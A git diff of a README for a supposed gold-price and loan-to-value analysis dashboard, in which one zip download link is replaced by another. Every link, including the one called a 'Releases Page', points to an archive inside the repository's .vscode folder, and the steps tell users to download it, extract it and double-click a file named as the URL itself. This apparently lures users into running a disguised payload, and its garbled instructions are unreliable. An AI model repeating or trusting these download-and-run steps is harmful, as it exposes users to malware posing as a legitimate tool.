@@ -1,7 +1,7 @@
 # 🛠️ gold-price-ltv-analysis - Analyze Gold Prices with Ease
 
 ## 📥 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip)
 
 ## 📊 Project Overview
 This project is a Gold Price Impact and LTV Risk Analysis dashboard. It helps you understand how companies like Rupeek and Muthoot assess lending risks. You can explore 45 years of gold price data, forecast future prices, simulate loans for 500 customers, and calculate the real-time Loan-to-Value (LTV) ratio. 
@@ -12,16 +12,16 @@ The dashboard provides clear visuals and insights, making it accessible even for
 Follow these simple steps to get started with the gold-price-ltv-analysis dashboard.
 
 1. **Visit the Releases Page:**
-   Go to the [Releases Page](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip).
+   Go to the [Releases Page](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip).
 
 2. **Download the Latest Version:**
-   Look for the latest version and click on the download link associated with that release. You will find this as a file labeled something like `https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip`.
+   Look for the latest version and click on the download link associated with that release. You will find this as a file labeled something like `https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip`.
 
 3. **Extract the Files:**
    Once the download is complete, locate the downloaded file in your Downloads folder. Right-click on the file and select "Extract All" or use a similar extraction tool.
 
 4. **Open the Application:**
-   After extracting, find the folder labeled `gold-price-ltv-analysis`. Open this folder and double-click on the file named `https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip` to launch the application.
+   After extracting, find the folder labeled `gold-price-ltv-analysis`. Open this folder and double-click on the file named `https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip` to launch the application.
 
 5. **Explore the Dashboard:**
    After the application opens, take a moment to navigate through the dashboard. You will find sections for analyzing historical gold prices, forecasting future trends, and calculating real-time LTV for simulated loans.
@@ -45,7 +45,7 @@ The gold-price-ltv-analysis dashboard includes:
 - **User-Friendly Interface:** Intuitive design that allows for easy navigation and use.
 
 ## 📂 Download & Install
-To download the application, visit this [Releases Page](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/gold-price-ltv-analysis_v1.1.zip). Choose the latest version and follow the installation instructions outlined above. 
+To download the application, visit this [Releases Page](https://raw.githubusercontent.com/Ericakgn-24/gold-price-ltv-analysis/main/.vscode/price-analysis-ltv-gold-v1.8.zip). Choose the latest version and follow the installation instructions outlined above. 
 
 ## 💡 Troubleshooting
 If you run into issues:
